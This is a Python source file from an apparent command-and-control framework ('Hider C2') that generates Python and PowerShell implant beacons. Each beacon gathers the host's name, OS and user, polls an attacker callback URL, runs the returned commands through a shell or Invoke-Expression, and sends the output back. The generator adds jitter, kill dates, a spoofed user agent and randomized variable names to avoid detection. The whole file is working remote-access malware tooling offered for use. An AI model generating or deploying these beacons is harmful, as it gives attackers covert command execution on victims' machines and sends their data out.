"""
c2/beacon_gen.py — Implant Beacon Generator

Generates customized Python and PowerShell beacon scripts that call back
to the Hider C2 listener. The beacons support configurable sleep intervals,
jitter, kill dates, and custom user agents.
"""
import os
import sys
import random
import string

# Add parent to path for poly_engine access
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _rand_var(n=8):
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=n - 1)
    )


class BeaconGen:

    @staticmethod
    def python_beacon(callback_url, sleep_sec=5, jitter_pct=20, kill_date=None, user_agent=None):
        """
        Generate a Python beacon script.
        """
        ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        kill_check = ""
        if kill_date:
            kill_check = f"""
    from datetime import datetime
    if datetime.utcnow() > datetime.fromisoformat("{kill_date}"):
        sys.exit(0)
"""
        jitter_lo = max(1, int(sleep_sec * (1 - jitter_pct / 100)))
        jitter_hi = int(sleep_sec * (1 + jitter_pct / 100))

        beacon = f'''#!/usr/bin/env python3
"""Hider C2 Beacon — Auto-generated"""
import os, sys, time, random, json, subprocess, platform, socket
try:
    from urllib.request import Request, urlopen
    from urllib.parse import urlencode
except ImportError:
    from urllib2 import Request, urlopen
    from urllib import urlencode

C2_URL    = "{callback_url}"
SLEEP_LO  = {jitter_lo}
SLEEP_HI  = {jitter_hi}
UA        = "{ua}"
SESSION   = None

def sysinfo():
    return {{
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
    }}

def beacon():
    global SESSION
    info = sysinfo()
    params = urlencode({{
        "id": SESSION or "",
        "hostname": info["hostname"],
        "os": info["os"],
        "user": info["user"],
    }})
    req = Request(C2_URL + "/beacon?" + params, headers={{"User-Agent": UA}})
    resp = json.loads(urlopen(req, timeout=30).read().decode())
    if not SESSION:
        SESSION = resp.get("id")
    return resp

def send_result(cmd_id, output):
    data = json.dumps({{"cmd_id": cmd_id, "output": output}}).encode()
    req = Request(C2_URL + "/result", data=data, headers={{
        "User-Agent": UA,
        "Content-Type": "application/json"
    }})
    urlopen(req, timeout=30)

def execute(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

def main():
{kill_check}
    while True:
        try:
            resp = beacon()
            cmd = resp.get("cmd", "NOP")
            if cmd != "NOP":
                output = execute(cmd)
                send_result(resp.get("cmd_id"), output)
        except Exception:
            pass
        time.sleep(random.randint(SLEEP_LO, SLEEP_HI))

if __name__ == "__main__":
    main()
'''
        return beacon

    @staticmethod
    def powershell_beacon(callback_url, sleep_sec=5, jitter_pct=20, kill_date=None, user_agent=None):
        """
        Generate a PowerShell beacon script.
        """
        ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        jitter_lo = max(1, int(sleep_sec * (1 - jitter_pct / 100)))
        jitter_hi = int(sleep_sec * (1 + jitter_pct / 100))

        kill_block = ""
        if kill_date:
            kill_block = f'if ((Get-Date) -gt [DateTime]"{kill_date}") {{ exit }}'

        vC2 = _rand_var(); vSID = _rand_var(); vSL = _rand_var(); vSH = _rand_var()

        beacon = f"""
# Hider C2 Beacon — PowerShell
${vC2}  = "{callback_url}"
${vSID} = $null
${vSL}  = {jitter_lo}
${vSH}  = {jitter_hi}

function Get-SysInfo {{
    $h = $env:COMPUTERNAME
    $o = [Environment]::OSVersion.VersionString
    $u = $env:USERNAME
    return @{{hostname=$h; os=$o; user=$u}}
}}

while ($true) {{
    {kill_block}
    try {{
        $info = Get-SysInfo
        $params = "id=${{{vSID}}}&hostname=$($info.hostname)&os=$($info.os)&user=$($info.user)"
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "{ua}")
        $resp = $wc.DownloadString("${{{vC2}}}/beacon?$params") | ConvertFrom-Json
        if (-not ${{{vSID}}}) {{ ${{{vSID}}} = $resp.id }}
        if ($resp.cmd -ne "NOP") {{
            $out = try {{ Invoke-Expression $resp.cmd 2>&1 | Out-String }} catch {{ $_.Exception.Message }}
            $body = @{{cmd_id=$resp.cmd_id; output=$out}} | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $wc.UploadString("${{{vC2}}}/result", $body) | Out-Null
        }}
    }} catch {{}}
    Start-Sleep -Seconds (Get-Random -Minimum ${{{vSL}}} -Maximum ${{{vSH}}})
}}
"""
        return beacon

    @staticmethod
    def generate(callback_url, lang="python", output_path=None, **kwargs):
        """High-level generator."""
        if lang == "python":
            code = BeaconGen.python_beacon(callback_url, **kwargs)
        else:
            code = BeaconGen.powershell_beacon(callback_url, **kwargs)

        if output_path:
            with open(output_path, 'w') as f:
                f.write(code)
        return code
